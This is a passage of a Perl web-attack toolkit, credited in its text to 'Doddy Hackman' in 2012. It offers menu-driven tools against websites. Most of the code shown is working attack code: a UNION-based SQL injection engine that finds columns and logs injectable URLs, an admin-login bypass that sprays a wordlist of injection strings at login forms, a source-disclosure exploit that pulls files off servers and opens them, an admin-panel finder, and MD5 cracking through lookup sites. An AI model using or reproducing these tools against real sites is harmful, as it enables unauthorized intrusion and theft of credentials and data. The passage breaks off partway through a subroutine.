        menu_crackhash();
        printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
        <stdin>;
        estoydentro();
    }
    elsif ( $op eq "8" ) {
        clean();
        start_panel();
    }
    elsif ( $op eq "9" ) {
        load_cmd();
    }
    elsif ( $op eq "10" ) {
        head_menu();
        printear(
"\n\n\t\tThis program was coded By Doddy H in the year 2012\n\n\n\n",
            "text", "13", "5"
        );
        <stdin>;
        estoydentro();
    }
    elsif ( $op eq "11" ) {
        my $op = printear( "\n\n\n\t\t\t[+] Good Bye", "stdin", "7", "13" );

        #<stdin>;
        exit(1);
    }
    else {
        estoydentro();
    }    #Fin de control
}

sub estoydentroporahora {
    my $op = printear( "\n\n\n\t\t[+] Press any key for return to the menu",
        "stdin", "7", "13" );

    #<stdin>;
    estoydentro();
}

sub menu_central {
    printear( "\n\n\t\t\t -- == Options == --\n\n", "text", "13", "5" );
    printear(
        "\n
\t\t\t[+] 1 : Web Scanner\n
\t\t\t[+] 2 : SQLi Scanner\n
\t\t\t[+] 3 : Bypass Admin\n
\t\t\t[+] 4 : FSD Exploit Manager\n
\t\t\t[+] 5 : Paths Finder\n
\t\t\t[+] 6 : Locate IP\n
\t\t\t[+] 7 : Crack MD5\n
\t\t\t[+] 8 : Panel Finder\n
\t\t\t[+] 9 : CMD\n
\t\t\t[+] 10 : About\n
\t\t\t[+] 11 : Exit\n
", "text", "13", "5"
    );
}

sub menu_login {

    my $test_username = "";
    my $test_password = "";

    printear( "\n\n\t\t\t-- == Login == --\n\n\n\n", "text", "13", "5" );
    my $username = printear( "\t\t\t[+] Username : ",   "stdin", "11", "13" );
    my $password = printear( "\n\t\t\t[+] Password : ", "stdin", "11", "13" );

    my $word = getdatanownownownow();

    if ( $word =~ /username=(.*)/ ) {
        $test_username = $1;
    }

    if ( $word =~ /password=(.*)/ ) {
        $test_password = $1;
    }

    if (    $test_username eq md5_hex($username)
        and $test_password eq md5_hex($password) )
    {
        return "yes";
    }
    else {
        return "no";
    }

}

sub instalar {
    printear( "\n\n\t\t\t-- == Program settings == --\n\n\n\n",
        "text", "13", "5" );

    my $username = printear( "\t\t\t[+] Username : ",   "stdin", "11", "13" );
    my $password = printear( "\n\t\t\t[+] Password : ", "stdin", "11", "13" );
    my $proxy    = printear( "\n\t\t\t[+] Proxy : ",    "stdin", "11", "13" );
    my $colores =
      printear( "\n\t\t\t[+] Colors [y,n] : ", "stdin", "11", "13" );

    open( FILE, ">>data.txt" );
    print FILE "username=" . md5_hex($username) . "\n";
    print FILE "password=" . md5_hex($password) . "\n";
    if ( $proxy ne "" ) {
        print FILE "proxy=" . $proxy . "\n";
    }
    print FILE "colors=" . $colores . "\n";
    close FILE;

    inicio_total();
}

sub head_menu {
    clean();
    printear( "


@@@@@   @   @@@@     @   @@  @@@  @@@   @@@  @@@@     @@@   @@@@    @   @@  @@@
 @  @   @    @  @    @    @@  @  @   @   @  @   @    @  @  @   @    @    @@  @ 
 @  @  @ @   @  @   @ @   @@  @ @     @  @ @         @    @        @ @   @@  @ 
 @@@   @ @   @@@    @ @   @ @ @ @     @  @ @          @@  @        @ @   @ @ @ 
 @    @@@@@  @ @   @@@@@  @ @ @ @     @  @ @            @ @       @@@@@  @ @ @ 
 @    @   @  @  @  @   @  @  @@  @   @   @  @   @    @  @  @   @  @   @  @  @@ 
@@@  @@@ @@@@@@  @@@@ @@@@@@  @   @@@   @@@  @@@     @@@    @@@  @@@ @@@@@@  @ 


", "text", "11", "5" );

    printear( "

                                           
                                           
\t\t                 ¾¾¾¾¾¾¾¾¾¾¾               
\t\t              ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾           
\t\t            ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾          
\t\t          ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾         
\t\t          ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾        
\t\t         ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾       
\t\t        ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾       
\t\t        ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾       
\t\t        ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾      
\t\t         ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾      
\t\t         ¾¾¾¾¾¾¾  ¾¾¾¾¾¾¾¾¾¾¾    ¾¾¾¾       
\t\t          ¾¾¾¾       ¾¾¾¾¾¾      ¾¾¾¾       
\t\t           ¾¾¾      ¾¾¾ ¾¾¾      ¾¾¾        
\t\t           ¾¾¾¾¾¾¾¾¾¾¾   ¾¾¾   ¾¾¾¾         
\t\t            ¾¾¾¾¾¾¾¾¾     ¾¾¾¾¾¾¾¾¾         
\t\t            ¾¾¾¾¾¾¾¾¾  ¾  ¾¾¾¾¾¾¾¾¾         
\t\t            ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾         
\t\t                 ¾¾¾¾¾¾¾¾¾¾¾¾¾              
\t\t               ¾  ¾¾¾¾¾¾¾¾¾¾  ¾             
\t\t               ¾    ¾ ¾¾¾¾ ¾  ¾             
\t\t               ¾ ¾¾          ¾¾             
\t\t      ¾¾¾      ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾             
\t\t     ¾¾¾¾¾      ¾¾¾¾¾¾¾¾¾¾¾¾¾¾      ¾¾¾     
\t\t     ¾¾¾¾¾¾¾      ¾¾¾¾¾¾¾¾¾¾¾      ¾¾¾¾¾¾   
\t\t     ¾¾¾¾¾¾¾¾¾¾      ¾¾¾         ¾¾¾¾¾¾¾¾¾  
\t\t      ¾¾¾  ¾¾¾¾¾¾             ¾¾¾¾¾¾¾¾¾¾¾   
\t\t               ¾¾¾¾¾¾     ¾¾¾¾¾¾¾           
\t\t                  ¾¾¾¾¾¾¾¾¾¾¾¾              
\t\t                   ¾¾¾¾¾¾¾¾¾                
\t\t                ¾¾¾¾¾¾¾ ¾¾¾¾¾¾¾             
\t\t            ¾¾¾¾¾¾¾         ¾¾¾¾¾¾¾         
\t\t        ¾¾¾¾¾¾¾                ¾¾¾¾¾¾¾¾¾¾   
\t\t   ¾¾¾¾¾¾¾¾                       ¾¾¾¾¾¾¾¾  
\t\t   ¾¾¾¾¾¾                           ¾¾¾¾¾¾  
\t\t    ¾¾¾¾                             ¾¾¾¾   
                                           
                                           
                                           


", "text", "7", "5" );

}

sub printear {    #
    my $test;
    my $word = getdatanownownownow();

    if ( $word =~ /colors=(.*)/ ) {
        $test = $1;
    }
    if ( $test eq "y" ) {
        if ( $_[1] eq "text" ) {
            cprint( "\x03" . $_[2] . $_[0] . "\x030" );
        }
        elsif ( $_[1] eq "stdin" ) {
            if ( $_[3] ne "" ) {
                cprint( "\x03" . $_[2] . $_[0] . "\x030" . "\x03" . $_[3] );
                my $op = <stdin>;
                chomp $op;
                cprint("\x030");
                return $op;
            }
        }
        else {
            print "error\n";
        }
    }
    else {    #
        if ( $_[1] eq "text" ) {
            print( $_[0] );
        }
        elsif ( $_[1] eq "stdin" ) {
            if ( $_[3] ne "" ) {
                cprint( $_[0] );
                my $op = <stdin>;
                chomp $op;
                return $op;
            }
        }
    }
}    #Fin de printear

sub clean {
    my $os = $^O;
    if ( $os =~ /Win32/ig ) {
        system("cls");
    }
    else {
        system("clear");
    }
}

sub copyright_menu {
    printear( "\n\n\t\t\t(C) Doddy Hackman 2012\n\n", "text", "11", "5" );
    exit(1);
}

##Funciones del programa ##

sub start_panel {

    head_panel();
    my $page  = printear( "[+] Page : ",    "stdin", "11", "13" );
    my $count = printear( "\n[+] Count : ", "stdin", "11", "13" );

    if ( $count eq "" ) {
        $count = 3;
    }

    scan_panel( $page, $count );
    printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
    <stdin>;
    estoydentro();

}

sub scan_panel {

    my $count = 0;

    printear( "\n\n[+] Searching .....\n\n\n", "text", "13", "5" );

    for my $path (@paneles) {

        if ( $count eq $_[1] ) {
            last;
        }

        $code = tomados( $_[0] . "/" . $path );

        if ( $code->is_success ) {
            $controlt = 1;
            $count++;
            printear(
                "\a\a[Link] : " . $_[0] . "/" . $path . "\n", "text",
                "7",                                          "5"
            );

            #savefile("admins_logs.txt",$_[0]."/".$path);
        }

    }

    if ( $controlt ne 1 ) {
        printear( "[-] Not found anything\n", "text", "5", "5" );
    }

}    ##

sub head_panel {
    printear( "


 @@@@@                    @     @@@@                          @
 @    @                   @    @    @             @           @
 @    @                   @    @                  @           @
 @    @  @@@  @ @@   @@@  @    @       @@@  @ @@  @@ @@  @@@  @
 @@@@@      @ @@  @ @   @ @    @      @   @ @@  @ @  @  @   @ @
 @       @@@@ @   @ @@@@@ @    @      @   @ @   @ @  @  @   @ @
 @      @   @ @   @ @     @    @      @   @ @   @ @  @  @   @ @
 @      @   @ @   @ @   @ @    @    @ @   @ @   @ @  @  @   @ @
 @       @@@@ @   @  @@@  @     @@@@   @@@  @   @  @ @   @@@  @


                                                    
", "text", "7", "5" );
}

sub menu_crackhash {

    head_crackhash();

    my $op = printear( "[+] Option : ", "stdin", "11", "13" );

    if ( $op eq "1" ) {
        my $ha = printear( "\n\n[+] Hash : ", "stdin", "11", "13" );
        if ( ver_length($ha) ) {
            printear( "\n\n[+] Cracking Hash...\n", "text", "13", "5" );
            my $re = crackit($ha);
            unless ( $re =~ /false01/ ) {
                printear( "\n\n[+] Cracked : $re\n\n", "text", "7", "5" );
                savefile( "hashes-found.txt", $ha . ":" . $re );
            }
            else {
                printear( "\n[-] Not Found\n\n", "text", "5", "5" );
            }
        }
        else {
            printear( "\n\n[-] Hash invalid\n\n", "text", "5", "5" );
        }
        printear( "\n[+] Finished", "text", "13", "5" );
        <stdin>;
        menu_crackhash();
    }
    if ( $op eq "2" ) {
        my $fi = printear( "\n\n[+] Wordlist : ", "stdin", "11", "13" );
        if ( -f $fi ) {
            printear( "\n\n[+] Opening File\n", "text", "13", "5" );
            open( WORD, $fi );
            my @varios = <WORD>;
            close WORD;
            my @varios = repes(@varios);
            printear( "[+] Hashes Found : " . int(@varios), "text", "13", "5" );
            printear( "\n\n[+] Cracking hashes...\n\n",     "text", "13", "5" );
            for $hash (@varios) {
                chomp $hash;
                if ( ver_length($hash) ) {
                    my $re = crackit($hash);
                    unless ( $re =~ /false01/ ) {
                        printear( "[+] $hash : $re\n", "text", "7", "5" );
                        savefile( "hashes-found.txt", $hash . ":" . $re );
                    }
                }
            }
        }
        else {
            printear( "\n\n[-] File Not Found\n\n", "text", "5", "5" );
        }
        printear( "\n[+] Finished", "text", "13", "5" );
        <stdin>;
        menu_crackhash();
    }
    if ( $op eq "3" ) {
        printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
        <stdin>;
        estoydentro();
    }
}

sub crackit {

    my $target = shift;

    chomp $target;

    my %hash = (

        'http://md5.hashcracking.com/search.php?md5=' => {
            'tipo'  => 'get',
            'regex' => "Cleartext of $target is (.*)",
        },

        'http://www.hashchecker.com/index.php?_sls=search_hash' => {
            'variables' => { 'search_field' => $target, 'Submit' => 'search' },
            'regex' =>
              "<td><li>Your md5 hash is :<br><li>$target is <b>(.*)<\/b>",
        },

        'http://md5.rednoize.com/?q=' => {
            'tipo'  => 'get',
            'regex' => "<div id=\"result\" >(.*)<\/div>"
        },

        'http://md52.altervista.org/index.php?md5=' => {
            'tipo'  => 'get',
            'regex' => "<br>Password: <font color=\"Red\">(.*)<\/font><\/b>"
          }

    );

    for my $data ( keys %hash ) {
        if ( $hash{$data}{tipo} eq "get" ) {
            $code = toma( $data . $target );
            if ( $code =~ /$hash{$data}{regex}/ig ) {
                my $found = $1;
                unless ( $found =~ /\[Non Trovata\]/ ) {
                    return $found;
                    last;
                }
            }
        }
        else {
            $code = tomar( $data, $hash{$data}{variables} );
            if ( $code =~ /$hash{$data}{regex}/ig ) {
                my $found = $1;
                return $found;
                last;
            }
        }
    }
    return "false01";
}

sub head_crackhash {
    clean();
    printear( "


##########  #########  #########     #####   #    ###  ###
 #  # #  ##  #  #   #   #  # #  #     #  #   #   #  # #  #
 #    #  ##  #  #    #  #    #  #     #  #  # #  #    #   
 ###  #  # # #  #    #  ###  ###      ###   # #   ##   ## 
 #    #  # # #  #    #  #    # #      #    #####    #    #
 #    #  #  ##  #   #   #  # #  #     #    #   # #  # #  #
###  ######  # #####   ########  #   ###  ### ######  ### 



", "text", "5", "5" );
    printear( "
[++] Options


[+] 1 : Hash
[+] 2 : File with hashes
[+] 3 : Exit 


", "text", "3", "5" );
}    ##

sub load_locateip {

    head_locateip();
    my $page = printear( "[+] Page : ", "stdin", "11", "13" );
    infocon($page);
    printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
    <stdin>;
    estoydentro();

    sub head_locateip {
        clean();
        printear( "



 @      @@@@    @@@@    @    @@@@@  @@@@@     @  @@@@@ 
 @     @    @  @    @   @      @    @         @  @    @
 @     @    @  @       @ @     @    @         @  @    @
 @     @    @  @       @ @     @    @         @  @    @
 @     @    @  @      @   @    @    @@@@      @  @@@@@ 
 @     @    @  @      @   @    @    @         @  @     
 @     @    @  @      @@@@@    @    @         @  @     
 @     @    @  @    @@     @   @    @         @  @     
 @@@@@  @@@@    @@@@ @     @   @    @@@@@     @  @     



", "text", "7", "5" );
    }

    sub infocon {
        my $target = shift;

        my $get    = gethostbyname($target);
        my $target = inet_ntoa($get);

        printear( "\n\n[+] Getting info\n\n\n", "text", "13", "5" );

        $total =
          "http://www.melissadata.com/lookups/iplocation.asp?ipaddress=$target";
        $re = toma($total);

        if ( $re =~ /City<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ ) {
            printear( "[+] City : $2\n", "text", "7", "5" );
        }
        else {
            printear( "[-] Not Found\n",      "text", "5",  "5" );
            printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
            <stdin>;
            estoydentro();
        }
        if ( $re =~ /Country<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ ) {
            printear( "[+] Country : $2\n", "text", "7", "5" );
        }
        if ( $re =~ /State or Region<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ ) {
            printear( "[+] State or Region : $2\n", "text", "7", "5" );
        }

        printear( "\n\n[+] Getting Hosts\n\n\n", "text", "13", "5" );

        my $code = toma( "http://www.ip-adress.com/reverse_ip/" . $target );

        while ( $code =~ /whois\/(.*?)\">Whois/g ) {
            my $dns = $1;
            chomp $dns;
            printear( "[DNS] : $dns\n", "text", "7", "5" );
        }
    }

}    ##

##

sub load_findpaths {

    head_paths();
    my $web = printear( "[+] Web : ", "stdin", "11", "13" );
    printear( "\n\n[+] Scan Type\n\n", "text", "5", "5" );
    printear( "[+] 1 : Fast\n",        "text", "3", "5" );
    printear( "[+] 2 : Full\n",        "text", "3", "5" );
    my $op = printear( "\n\n[+] Option : ", "stdin", "11", "13" );
    printear( "\n\n[+] Scanning ....\n\n\n", "text", "13", "5" );

    if ( $op eq "1" ) {
        simple($web);
    }
    elsif ( $op eq "2" ) {
        escalar($web);
    }
    else {
        simplex($web);
    }
    printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
    <stdin>;
    estoydentro();

    sub escalar {

        my $co    = $_[0];
        my $code  = toma( $_[0] );
        my @links = get_links($code);

        if ( $code =~ /Index of (.*)/ig ) {
            printear( "[+] Link : $co\n", "text", "7", "5" );
            savefile( "paths-logs.txt", $co );
            my $dir_found = $1;
            chomp $dir_found;
            while ( $code =~ /<a href=\"(.*)\">(.*)<\/a>/ig ) {
                my $ruta   = $1;
                my $nombre = $2;
                unless ( $nombre =~ /Parent Directory/ig
                    or $nombre =~ /Description/ig )
                {
                    push( @encontrados, $_[0] . "/" . $nombre );
                }
            }
        }

        for my $com (@links) {
            my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );
            if ( $path =~ /\/(.*)$/ ) {
                my $path1 = $1;
                $_[0] =~ s/$path1//ig;
                my ( $scheme, $auth, $path, $query, $frag ) = uri_split($com);
                if ( $path =~ /(.*)\// ) {
                    my $parche = $1;
                    unless ( $repetidos =~ /$parche/ ) {
                        $repetidos .= " " . $parche;
                        my $yeah = "http://" . $auth . $parche;
                        escalar($yeah);
                    }
                }
                for (@encontrados) {
                    escalar($_);
                }
            }
        }
    }

    sub simplex {

        my $code  = toma( $_[0] );
        my @links = get_links($code);

        for my $com (@links) {
            my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );
            if ( $path =~ /\/(.*)$/ ) {
                my $path1 = $1;
                $_[0] =~ s/$path1//ig;
                my ( $scheme, $auth, $path, $query, $frag ) = uri_split($com);
                if ( $path =~ /(.*)\// ) {
                    my $parche = $1;
                    unless ( $repetidos =~ /$parche/ ) {
                        $repetidos .= " " . $parche;
                        my $code = toma( "http://" . $auth . $parche );

                        if ( $code =~ /Index of (.*)</ig ) {
                            my $dir_found = $1;
                            chomp $dir_found;
                            my $yeah = "http://" . $auth . $parche;
                            printear( "[+] Link : $yeah\n", "text", "7", "5" );
                            savefile( "paths-logs.txt", $yeah );
                        }
                    }
                }
            }
        }
    }

    sub head_paths {
        clean();
        printear( "


 @@@@@ @           @             @@@@@           @         
 @                 @             @    @       @  @         
 @                 @             @    @       @  @         
 @     @ @ @@   @@@@  @@@  @@    @    @  @@@  @@ @ @@   @@ 
 @@@@  @ @@  @ @   @ @   @ @     @@@@@      @ @  @@  @ @  @
 @     @ @   @ @   @ @@@@@ @     @       @@@@ @  @   @  @  
 @     @ @   @ @   @ @     @     @      @   @ @  @   @   @ 
 @     @ @   @ @   @ @   @ @     @      @   @ @  @   @ @  @
 @     @ @   @  @@@@  @@@  @     @       @@@@  @ @   @  @@ 





", "text", "7", "5" );
    }

}    ##

sub load_fsd {

    head_fsd();
    my $page = printear( "[+] Page : ", "stdin", "11", "13" );
    ver_now_now($page);
    printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
    <stdin>;
    estoydentro();

    sub ver_now_now {

        my $page = shift;

        printear( "\n[+] Target : " . $page . "\n\n", "text", "13", "5" );

        my ( $scheme, $auth, $path, $query, $frag ) = uri_split($page);

        if ( $path =~ /\/(.*)$/ ) {
            my $me = $1;
            $code1 = toma( $page . $me );
            if ( $code1 =~ /header\((.*)Content-Disposition: attachment;/ig ) {
                printear(
                    "[+] Full Source Discloure Detect\a\n", "text",
                    "7",                                    "5"
                );
                $code2 = toma( $page . "'" );
                if ( $code2 =~
                    /No such file or directory in <b>(.*)<\/b> on line/ )
                {
                    printear( "\n[+] Full Path Dislocure Detect : " . $1 . "\n",
                        "text", "7", "5" );
                }
                installer_fsd();
                while (1) {
                    my $url = printear( "\n\nURL>", "stdin", "11", "13" );
                    if ( $url eq "exit" ) {
                        adios();
                    }
                    if ( download( $page . $url, "fsdlogs/" . basename($url) ) )
                    {
                        printear( "\n\n[+] File Downloaded\n",
                            "text", "13", "5" );
                        system( "start fsdlogs/" . basename($url) );
                    }
                }
            }
            else {
                printear( "[-] Web not vulnerable\n\n", "text", "5", "5" );
            }
        }
    }

    sub adios {
        printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
        <stdin>;
        estoydentro();
    }

    sub head_fsd {
        clean();
        printear( "


 @@@@@  @@@   @@@@       @@@@@ @     @ @@@@@  @      @@@@   @  @@@@@
 @     @   @  @   @      @     @     @ @    @ @     @    @  @    @  
 @     @      @    @     @      @   @  @    @ @     @    @  @    @  
 @     @      @    @     @       @ @   @    @ @     @    @  @    @  
 @@@@   @@@   @    @     @@@@     @    @@@@@  @     @    @  @    @  
 @         @  @    @     @       @ @   @      @     @    @  @    @  
 @         @  @    @     @      @   @  @      @     @    @  @    @  
 @     @   @  @   @      @     @     @ @      @     @    @  @    @  
 @      @@@   @@@@       @@@@@ @     @ @      @@@@@  @@@@   @    @  




", "text", "7", "5" );
    }

    sub download {
        if ( $nave->mirror( $_[0], $_[1] ) ) {
            if ( -f $_[1] ) {
                return true;
            }
        }
    }

    sub installer_fsd {
        unless ( -d "fsdlogs/" ) {
            mkdir( "fsdlogs/", "777" );
        }
    }

}    ##

sub load_bypass {

    head_bypass();
    start_com();
    printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
    <stdin>;
    estoydentro();

    sub start_com {
        my $url = printear( "\n\n[+] Admin : ", "stdin", "11", "13" );

        my $code = toma($url);

        my @testar = HTML::Form->parse( $code, "/" );

        $count = 0;
        foreach my $test (@testar) {
            $count++;
            printear( "\n\n -- == Form $count == --\n\n", "text", "5", "5" );
            if ( $test->attr(name) eq "" ) {
                printear( "[+] Name : No Found" . "\n", "text", "13", "5" );
            }
            else {
                printear(
                    "[+] Name : " . $test->attr(name) . "\n", "text",
                    "13",                                     "5"
                );
            }
            printear( "[+] Action : " . $test->action . "\n",
                "text", "13", "5" );
            printear( "[+] Method : " . $test->method . "\n",
                "text", "13", "5" );
            printear( "\n-- == Input == --\n\n", "text", "5", "5" );
            @inputs = $test->inputs;

            foreach $in (@inputs) {
                printear( "\n[+] Type : " . $in->type . "\n",
                    "text", "13", "5" );
                printear( "[+] Name : " . $in->name . "\n", "text", "13", "5" );
                printear( "[+] Value : " . $in->value . "\n",
                    "text", "13", "5" );
            }
        }

        my $op  = printear( "\n\n[+] Form to crack : ", "stdin", "11", "13" );
        my $aca = printear( "\n[+] Submit : ",          "stdin", "11", "13" );

        printear( "\n[+] Options to check\n\n", "text", "5",  "5" );
        printear( "1 - Positive\n",             "text", "13", "5" );
        printear( "2 - Negative\n",             "text", "13", "5" );
        printear( "3 - Automatic\n\n",          "text", "13", "5" );
        my $op2 = printear( "[+] Option : ", "stdin", "11", "13" );

        my @bypass = loadwordsa();

        if ( $op2 eq "1" ) {
            my $st = printear( "\n[+] String : ", "stdin", "11", "13" );
            printear( "\n\n[+] Cracking login....\n\n", "text", "13", "5" );
            for my $by (@bypass) {
                chomp $by;
                my $code = load_nownow( $url, $code, $op, $aca, $by );
                if ( $code =~ /$st/ig ) {
                    cracked( $url, $by );
                }
            }
            printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
            <stdin>;
            estoydentro();
        }

        if ( $op2 eq "2" ) {
            my $st = printear( "\n[+] String : ", "stdin", "11", "13" );
            printear( "\n\n[+] Cracking login....\n\n", "text", "13", "5" );
            for my $by (@bypass) {
                chomp $by;
                my $code = load_nownow( $url, $code, $op, $aca, $by );
                unless ( $code =~ /$st/ig ) {
                    cracked( $url, $by );
                }
            }
            printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
            <stdin>;
            estoydentro();
        }

        if ( $op2 eq "3" ) {
            printear( "\n\n[+] Cracking login....\n\n", "text", "13", "5" );
            my $prueba_falsa =
              load_nownow( $url, $code, $op, $aca, "fuck you" );
            for my $by (@bypass) {
                chomp $by;
                my $code = load_nownow( $url, $code, $op, $aca, $by );
                unless ( $code eq $prueba_falsa ) {
                    cracked( $url, $by );
                }
            }
            printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
            <stdin>;
            estoydentro();
        }
    }

    sub load_nownow {

        my ( $url, $code, $op, $aca, $text ) = @_;

        $op--;
        my @probar = ( HTML::Form->parse( $code, "/" ) )[$op];

        for my $testa (@probar) {
            if ( $testa->method eq "POST" ) {

                my @inputs = $testa->inputs;
                for my $in (@inputs) {
                    if ( $in->type eq "submit" ) {
                        if ( $in->name eq $aca ) {
                            push( @botones_names,  $in->name );
                            push( @botones_values, $in->value );
                        }
                    }
                    else {
                        push( @ordenuno, $in->name, $text );
                    }
                }

                my @preuno = @ordenuno;
                push( @preuno, $botones_names[0], $botones_values[0] );
                my $codeuno = $nave->post( $url, \@preuno )->content;

                return $codeuno;

            }
            else {

                my $final    = "";
                my $orden    = "";
                my $partedos = "";

                my @inputs = $testa->inputs;
                for my $testa (@inputs) {

                    if ( $testa->name eq $aca ) {

                        push( @botones_names,  $testa->name );
                        push( @botones_values, $testa->value );
                    }
                    else {
                        $orden .= '' . $testa->name . '=' . $text . '&';
                    }
                }
                chop($orden);

                my $partedos =
                  "&" . $botones_names[0] . "=" . $botones_values[0];
                my $final = $url . "?" . $orden . $partedos;

                $codedos = toma($final);
                return $codedos;
            }
        }
    }

    sub cracked {
        printear( "\a\a[+] Login Cracked\n\n", "text", "7", "5" );
        printear( "[+] URL : $_[0]\n",         "text", "7", "5" );
        printear( "[+] Bypass : $_[1]\n",      "text", "7", "5" );
        savefile( "logs-bypass.txt", "[+] URL : $_[0]" );
        savefile( "logs-bypass.txt", "[+] Bypass : $_[1]\n" );
        printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
        <stdin>;
        estoydentro();
    }

    sub loadwordsa {

        my $file = "bypass.txt";

        if ( -f $file ) {

            open( FI, "bypass.txt" );
            my @txts = <FI>;
            close FI;
            chomp @txts;

            return @txts;

        }
        else {
            printear( "\n\n[-] Wordlist not found\n\n", "text", "5", "5" );
        }

    }

    sub head_bypass {
        clean();
        printear( "

 @@@@        @@@@@                       @        @         @      
 @   @       @    @                      @        @                
 @   @       @    @                     @ @       @                
 @   @  @  @ @    @  @@@   @@   @@      @ @    @@@@ @@@ @@  @ @ @@ 
 @@@@   @  @ @@@@@      @ @  @ @  @    @   @  @   @ @  @  @ @ @@  @
 @   @  @  @ @       @@@@  @    @      @   @  @   @ @  @  @ @ @   @
 @   @  @  @ @      @   @   @    @     @@@@@  @   @ @  @  @ @ @   @
 @   @   @@  @      @   @ @  @ @  @   @     @ @   @ @  @  @ @ @   @
 @@@@    @   @       @@@@  @@   @@    @     @  @@@@ @  @  @ @ @   @
         @                                                         
       @@                                                          



", "text", "7", "5" );
    }

}    ##

sub load_kobra {

    installer_kobra();
    clean();

    &head_kobra;
    &menu_kobra;

    printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
    <stdin>;
    estoydentro();

    sub menu_kobra {
        my $page = printear( "[Page] : ", "stdin", "11", "13" );
        my $bypass =
          printear( "\n[Bypass : -- /* %20] : ", "stdin", "11", "13" );
        print "\n\n";
        if ( $page eq "exit" ) {
            printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
            <stdin>;
            estoydentro();
        }
        &scan_kobra( $page, $bypass );
    }

    sub scan_kobra {
        my $page = $_[0];
        printear( "[Status] : Scanning.....\n", "text", "13", "5" );
        ( $pass1, $bypass2 ) = &bypass( $_[1] );

        my $save = partimealmedio( $_[0] );

        if ( $_[0] =~ /hackman/ig ) {
            savefilear( $save . ".txt", "\n[Target Confirmed] : $_[0]\n" );
            &menu_options( $_[0], $_[1], $save );
        }

        my $testar1 = toma( $page . $pass1 . "and" . $pass1 . "1=0" . $pass2 );
        my $testar2 = toma( $page . $pass1 . "and" . $pass1 . "1=1" . $pass2 );

        unless ( $testar1 eq $testar2 ) {
            motor( $page, $_[1] );
        }
        else {
            printear( "\n[-] Not vulnerable\n\n", "text", "5", "5" );
            my $op = printear( "[+] Scan anyway y/n : ", "stdin", "11", "13" );
            if ( $op eq "y" ) {
                motor( $page, $_[1] );
            }
            else {
                head_kobra();
                menu_kobra();
            }
        }

    }

    sub motor {

        my ( $gen, $save, $control ) = &length( $_[0], $_[1] );

        if ( $control eq 1 ) {
            printear( "\n[Status] : Enjoy the menu\n\n", "text", "13", "5" );
            &menu_options( $gen, $_[1], $save );
        }
        else {
            printear( "[Status] : Length columns not found\n\n",
                "text", "5", "5" );
            <STDIN>;
            &head_kobra;
            &menu_kobra;
        }
    }

    sub head_kobra {
        clean();
        printear( "
 @      @@   @             
@@     @  @ @@             
 @ @@  @  @  @ @   @ @ @@@ 
 @ @   @  @  @@ @ @@@ @  @ 
 @@    @  @  @  @  @   @@@ 
 @ @   @  @  @  @  @  @  @ 
@@@ @   @@   @@@  @@@ @@@@@




", "text", "7", "5" );
    }

    sub length {
        printear(
            "\n[+] Looking for the number of columns\n\n", "text",
            "13",                                          "5"
        );
        my $rows = "0";
        my $asc;
        my $page = $_[0];
        ( $pass1, $pass2 ) = &bypass( $_[1] );

        $alert = "char(" . ascii("RATSXPDOWN1RATSXPDOWN") . ")";
        $total = "1";
        for my $rows ( 2 .. 200 ) {
            $asc .= "," . "char("
              . ascii( "RATSXPDOWN" . $rows . "RATSXPDOWN" ) . ")";
            $total .= "," . $rows;
            $injection =
                $page . "1" 
              . $pass1 . "and" 
              . $pass1 . "1=0" 
              . $pass1 . "union"
              . $pass1
              . "select"
              . $pass1
              . $alert
              . $asc;
            $test = toma($injection);
            if ( $test =~ /RATSXPDOWN/ ) {
                @number = $test =~ m{RATSXPDOWN(\d+)RATSXPDOWN}g;
                $control = 1;

                my $save = partimealmedio( $_[0] );

                savefilear( $save . ".txt", "\n[Target confirmed] : $page" );
                savefilear( $save . ".txt", "[Bypass] : $_[1]\n" );
                savefilear( $save . ".txt",
                    "[Limit] : The site has $rows columns" );
                savefilear( $save . ".txt",
                    "[Data] : The number @number print data" );
                $total =~ s/$number[0]/hackman/;
                savefilear(
                    $save . ".txt",
                    "[SQLI] : " 
                      . $page . "1" 
                      . $pass1 . "and" 
                      . $pass1 . "1=0"
                      . $pass1 . "union"
                      . $pass1
                      . "select"
                      . $pass1
                      . $total
                );
                return (
                    $page . "1" 
                      . $pass1 . "and" 
                      . $pass1 . "1=0" 
                      . $pass1 . "union"
                      . $pass1
                      . "select"
                      . $pass1
                      . $total,
                    $save, $control
                );
            }
        }
    }

    sub details {
        my ( $page, $bypass, $save ) = @_;
        ( $pass1, $pass2 ) = &bypass($bypass);
        savefilear( $save . ".txt", "\n" );
